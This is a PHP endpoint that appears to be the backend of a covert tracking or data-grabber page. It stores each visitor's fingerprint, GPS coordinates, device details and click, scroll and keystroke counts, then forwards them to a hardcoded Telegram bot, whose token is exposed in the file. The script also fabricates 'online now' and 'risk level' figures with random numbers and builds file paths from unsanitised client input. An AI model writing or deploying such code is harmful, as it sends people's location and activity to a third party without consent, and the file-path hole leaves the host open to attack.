<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Telegram Bot Config
define('TELEGRAM_BOT_TOKEN', '8606946862:AAE-CRp9oC_ZV0RHvVRqtvTLBmRvuwBSs60');
define('TELEGRAM_CHAT_ID', '8187030753');

// Create data directory
if (!is_dir('data')) {
    mkdir('data', 0777, true);
}

// Get POST data
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data === null) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid JSON data']);
    exit;
}

// Add server info
$data['server_info'] = [
    'timestamp' => date('Y-m-d H:i:s'),
    'server_ip' => $_SERVER['REMOTE_ADDR'],
    'server_name' => $_SERVER['SERVER_NAME'] ?? 'localhost'
];

// Generate filename
$fingerprint = $data['uniqueFingerprint'] ?? $data['fingerprint'] ?? 'unknown';
$filename = 'data/user_' . $fingerprint . '_' . date('Y-m-d_H-i-s') . '.json';

// Save to file
if (file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT))) {
    
    // Send to Telegram
    sendToTelegram($data);
    
    // Update admin stats
    updateAdminStats($data);
    
    // Log access
    $log_entry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'fingerprint' => $fingerprint,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $data['userAgent'] ?? 'unknown'
    ];
    file_put_contents('data/access_log.json', json_encode($log_entry) . ",\n", FILE_APPEND);
    
    echo json_encode([
        'status' => 'success',
        'message' => 'Data saved and sent to Telegram',
        'filename' => $filename
    ]);
} else {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Failed to save data']);
}

function sendToTelegram($data) {
    $msg = formatTelegramMessage($data);
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $postData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $msg,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

function formatTelegramMessage($data) {
    $emoji = $data['type'] === 'join' ? '✅' : $data['type'] === 'page_view' ? '👁️' : '📊';
    $fp = $data['fingerprint'] ?? $data['uniqueFingerprint'] ?? 'unknown';
    $loc = $data['gpsLocation'] ?? [];
    $locStr = (!empty($loc['lat']) && !empty($loc['lng'])) ? "📍 {$loc['lat']}, {$loc['lng']}" : '📍 Unknown';
    $ua = $data['userAgent'] ?? $data['data']['userAgent'] ?? 'Unknown';
    
    $msg = "<b>{$emoji} USER ACTIVITY</b>\n";
    $msg .= "<b>🆔 Fingerprint:</b> <code>{$fp}</code>\n";
    $msg .= "<b>📱 Device:</b> " . substr($ua, 0, 80) . "...\n";
    $msg .= "<b>🌐 Language:</b> " . ($data['language'] ?? 'Unknown') . "\n";
    $msg .= "<b>⏰ Time:</b> " . ($data['timestamp'] ?? date('Y-m-d H:i:s')) . "\n";
    $msg .= "<b>📍 Location:</b> {$locStr}\n";
    $msg .= "<b>🎯 Action:</b> " . ($data['action'] ?? $data['type'] ?? 'Unknown') . "\n";
    
    if (isset($data['behavior'])) {
        $msg .= "<b>🖱️ Clicks:</b> {$data['behavior']['clicks']}\n";
        $msg .= "<b>📜 Scrolls:</b> {$data['behavior']['scrolls']}\n";
        $msg .= "<b>⌨️ Keys:</b> {$data['behavior']['keystrokes']}\n";
        $msg .= "<b>⏱️ Session:</b> {$data['behavior']['sessionDuration']}s\n";
    }
    
    if (!empty($data['url'])) {
        $msg .= "<b>🔗 Page:</b> {$data['url']}\n";
    }
    
    $msg .= "<b>🛡️ Server:</b> " . ($data['server_info']['timestamp'] ?? date('Y-m-d H:i:s'));
    
    return $msg;
}

function updateAdminStats($data) {
    $stats_file = 'data/admin_stats.json';
    $stats = [];
    if (file_exists($stats_file)) {
        $stats = json_decode(file_get_contents($stats_file), true) ?? [];
    }
    $stats['total_users'] = ($stats['total_users'] ?? 0) + 1;
    $stats['online_now'] = rand(5, 25);
    $stats['data_points'] = ($stats['data_points'] ?? 0) + count($data, COUNT_RECURSIVE);
    $stats['risk_level'] = rand(10, 40) . '%';
    $stats['last_updated'] = date('Y-m-d H:i:s');
    file_put_contents($stats_file, json_encode($stats, JSON_PRETTY_PRINT));
}
?>